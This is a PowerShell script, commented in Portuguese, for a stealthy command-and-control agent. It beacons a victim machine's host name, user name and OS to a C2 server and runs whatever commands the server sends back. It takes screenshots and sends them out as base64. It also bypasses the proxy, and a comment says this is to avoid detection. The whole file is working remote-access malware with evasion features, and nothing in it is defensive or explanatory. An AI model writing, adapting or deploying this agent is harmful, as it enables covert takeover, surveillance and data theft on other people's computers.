# agent.ps1 - C2 Agent em PowerShell (Modo Silencioso)
param(
    [string]$C2Server = "http://192.168.0.10:8080/",
    [int]$BeaconInterval = 30
)

# Configurações
$AgentID = [System.Environment]::MachineName + "_" + (Get-Random -Maximum 9999)
$Jitter = 5
$CommandTimeout = 120

# Função para comunicação com C2
function Send-Beacon {
    param($Data)
    
    try {
        $body = @{
            id = $AgentID
            data = $Data
            host = $env:COMPUTERNAME
            user = $env:USERNAME
            os = (Get-WmiObject Win32_OperatingSystem).Caption
        } | ConvertTo-Json
        
        $utf8Body = [System.Text.Encoding]::UTF8.GetBytes($body)
        $webRequest = [System.Net.WebRequest]::Create("$C2Server/beacon")
        $webRequest.Method = "POST"
        $webRequest.ContentType = "application/json; charset=utf-8"
        $webRequest.ContentLength = $utf8Body.Length
        $webRequest.Timeout = 10000
        $webRequest.Proxy = $null  # Evitar detecção por proxy
        
        $requestStream = $webRequest.GetRequestStream()
        $requestStream.Write($utf8Body, 0, $utf8Body.Length)
        $requestStream.Close()
        
        $response = $webRequest.GetResponse()
        $reader = New-Object System.IO.StreamReader($response.GetResponseStream(), [System.Text.Encoding]::UTF8)
        $responseText = $reader.ReadToEnd()
        $reader.Close()
        $response.Close()
        
        return $responseText | ConvertFrom-Json
    }
    catch {
        return $null  # Silencioso - sem output
    }
}

# Função específica para capturar screenshot
function Get-Screenshot {
    try {
        # Carregar assemblies em memória
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        
        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64String = [System.Convert]::ToBase64String($memoryStream.ToArray())
        
        $graphics.Dispose()
        $bitmap.Dispose()
        $memoryStream.Dispose()
        
        return "SCREENSHOT_OK:" + $base64String
    }
    catch {
        return "SCREENSHOT_ERR:" + $_.ToString()
    }
}

# Função para executar comandos com timeout via Runspace (mais stealth que job)
function Execute-Command {
    param([string]$Command)
    
    try {
        # Comando especial de screenshot
        if ($Command.Trim().ToLower() -eq "screenshot") {
            return Get-Screenshot
        }
        
        # Usar Runspace em vez de Job (mais stealth, não cria processos filhos visíveis)
        $ps = [System.Management.Automation.PowerShell]::Create()
        [void]$ps.AddScript($Command)
        
        $async = $ps.BeginInvoke()
        
        # Timeout manual
        $timeout = $CommandTimeout * 1000
        if ($async.AsyncWaitHandle.WaitOne($timeout)) {
            $result = $ps.EndInvoke($async) | Out-String
        } else {
            $ps.Stop()
            $result = "COMMAND_TIMEOUT"
        }
        
        $ps.Dispose()
        return $result
    }
    catch {
        return "CMD_ERR:" + $_.ToString()
    }
}

# Função para enviar resultado (silenciosa)
function Send-Result {
    param($Result, $CommandId)
    
    try {
        $resultBody = @{
            id = $AgentID
            data = @{
                result = $Result
                command_id = $CommandId
            }
        } | ConvertTo-Json -Depth 3 -Compress  # Compress para minimizar tamanho

        $utf8Body = [System.Text.Encoding]::UTF8.GetBytes($resultBody)
        $webRequest = [System.Net.WebRequest]::Create("$C2Server/result")
        $webRequest.Method = "POST"
        $webRequest.ContentType = "application/json; charset=utf-8"
        $webRequest.ContentLength = $utf8Body.Length
        $webRequest.Timeout = 10000
        $webRequest.Proxy = $null
        
        $requestStream = $webRequest.GetRequestStream()
        $requestStream.Write($utf8Body, 0, $utf8Body.Length)
        $requestStream.Close()
        
        $response = $webRequest.GetResponse()
        $response.Close()
        return $true
    }
    catch {
        return $false
    }
}

# Loop principal - sem outputs
while ($true) {
    # Enviar beacon e receber comandos
    $response = Send-Beacon "heartbeat"
    
    if ($response -and $response.command) {
        # Executar comando
        $result = Execute-Command $response.command
        
        # Enviar resultado
        Send-Result -Result $result -CommandId $response.id
    }
    
    # Jitter - sleep silencioso
    $sleepTime = $BeaconInterval + (Get-Random -Minimum -$Jitter -Maximum $Jitter)
    Start-Sleep -Seconds $sleepTime
}

